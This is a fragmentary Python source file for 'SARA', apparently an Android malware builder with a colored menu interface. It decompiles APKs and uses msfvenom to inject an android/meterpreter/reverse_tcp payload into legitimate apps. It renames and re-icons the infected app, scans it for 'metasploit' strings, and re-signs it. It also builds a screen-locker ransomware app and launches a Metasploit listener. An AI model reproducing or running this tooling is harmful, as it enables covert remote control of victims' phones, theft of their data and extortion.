...
{c.BLUE}   /  /@@@@@@@//\\\@@@@@@@\  \\        {c.GRAY}version 3.1.1{c.RESET}
{c.BLUE}  (  /  '@@@@@====@@@@@'  \  )
   \(     /          \     )/
     \   (            )   /
          \          /{c.RESET}
    ...
    def status(message: str, status: str = "wait") -> str:
        ...
        status_colors = {"wait": c.YELLOW, "done": c.GREEN, "fail": c.RED}
...
class APKOperations:
    ...
    def decompile(apk_path: str) -> str:
        ...
        print(
            Console.status(f"decompile '{output_dir}.apk' using apktool", "wait"),
            end="\r",
        )
    ...
    def recompile(dir_path: str) -> str:
        ...
        if not os.path.isfile(apk_path):
            print(
                Console.status(f"recompile '{dir_path}' using apktool (aapt2)", "wait"),
                end="\r",
            )
            os.system(
                f"apktool b {dir_path} -o {apk_path} --use-aapt2 {Config.HIDE_OUTPUT}"
            )
    ...
    def sign(apk_path: str) -> str:
        ...
        print(
            Console.status(f"signing '{apk_path}' using uber-apk-signer", "wait"),
            end="\r",
        )

        cmd = (
            f"java -jar data/bin/ubersigner.jar -a {apk_path} "
        ...
        os.system(
            f"cp -rf {base_name}-aligned-signed.apk {signed_path} {Config.HIDE_OUTPUT}"
        )
    ...
    def update_icon(icon_path: str, apk_dir: str):
        print(
            Console.status(f"add '{Path(icon_path).name}' into 'ic_launcher'", "wait"),
            end="\r",
        )

        icon_files = (
            os.popen(f"find -O3 -L {apk_dir} -name 'ic_launcher.png'", "r")
            .read()
            .splitlines()
        )
        ...
        for icon_file in icon_files:
            if not os.path.isfile(icon_file):
                print(
                    Console.status(
                        f"add '{Path(icon_path).name}' into 'ic_launcher'", "fail"
                    )
                )
                sys.exit(1)
        ...
        print(
            Console.status(f"add '{Path(icon_path).name}' into 'ic_launcher'", "done")
        )
...
class APKModifier:
    ...
    def update_version(apk_dir: str) -> Tuple[str, str]:
        ...
        print(
            Console.status(f"add '{version_code}' into '{yml_path}'", "wait"), end="\r"
        )

        current_code = (
            os.popen(f"cat {yml_path} | grep 'versionCode'", "r").readline().strip()
        )
        os.system(
            f"sed -i \"s/{current_code}/versionCode: '{version_code}'/g\" {yml_path}"
        )
        print(Console.status(f"add '{version_code}' into '{yml_path}'", "done"))

        print(
            Console.status(f"add '{version_name}' into '{yml_path}'", "wait"), end="\r"
        )

        current_name = (
            os.popen(f"cat {yml_path} | grep 'versionName'", "r").readline().strip()
        )
...
class TrojanBuilder:
    ...
    def generate_infected(host: str, port: str, original_apk: str) -> str:
        ...
        cmd = (
            f"msfvenom -x {original_apk} -p android/meterpreter/reverse_tcp "
            f"lhost={host} lport={port} -a dalvik --platform android "
            f"-o {infected_apk}"
        )
        os.system(cmd)
        ...
        if not os.path.isfile(infected_apk):
            print(
                Console.status(
                    f"infection '{base_name}-infected.apk' using msfvenom", "fail"
                )
            )
            sys.exit(1)
        ...
        print(
            f"\n{Colors.RESET}"
            + Console.status(
                f"infection '{base_name}-infected.apk' using msfvenom", "done"
            )
        )
        return infected_apk
    ...
    def customize(apk_path: str, name: str, icon_path: str) -> str:
        ...
        FileUtils.replace_in_file(
            '"app_name">app_name', f'"app_name">{name}', strings_xml
        )
        ...
        grep_result = (
            os.popen(f"grep -rc 'metasploit' {apk_dir}", "r").read().splitlines()
        )
...
class RansomwareBuilder:
    ...
    def build_screen_locker(
        name: str, head: str, desc: str, passphrase: str, icon_path: str
    ) -> str:
        app_dir = name.lower().replace(" ", "")
        apk_path = f"{app_dir}.apk"
...
{c.GRAY}<{c.BLUE}sara{c.GRAY}>{c.RESET} : redirecting to the metasploit console
        ...
        cmd = (
            f'msfconsole -q -x "use payload/android/meterpreter/reverse_tcp;'
...
class SARA:
    ...
    def _get_listener_config(
        self, current_host: str, current_port: str
    ) -> Tuple[str, str]:
        c = Colors
...
{c.GRAY}<{c.BLUE}sara{c.GRAY}>{c.RESET} : well this process takes a few minutes,
        ...
        raw_apk = TrojanBuilder.generate_raw(
            host, port, name.replace(" ", "").replace(".apk", "").lower()
        )
...
{c.GRAY}<{c.BLUE}sara{c.GRAY}>{c.RESET} : well this process takes a few minutes,
        ...
        locker_apk = RansomwareBuilder.build_screen_locker(
            name, head, desc, passphrase, icon
        )
         ...
         (3) back to previous
                ...
                while True:
                    ...
                    if sub_choice in ("1", "01"):
                        ...
                        print(
                            f"{c.GRAY}<{c.BLUE}sara{c.GRAY}>{c.RESET} : sorry, no command found for: {sub_choice}"
                        )
                        continue
                    break
                ...
                print(
                    f"{c.GRAY}<{c.BLUE}sara{c.GRAY}>{c.RESET} : sorry, no command found for: {choice}"
                )
                continue
            break

        input(
            f"{c.GRAY}<{c.BLUE}sara{c.GRAY}>{c.RESET} : press enter for back to '{c.GREEN}main menu{c.RESET}' (enter) "
        )
        self.menu()
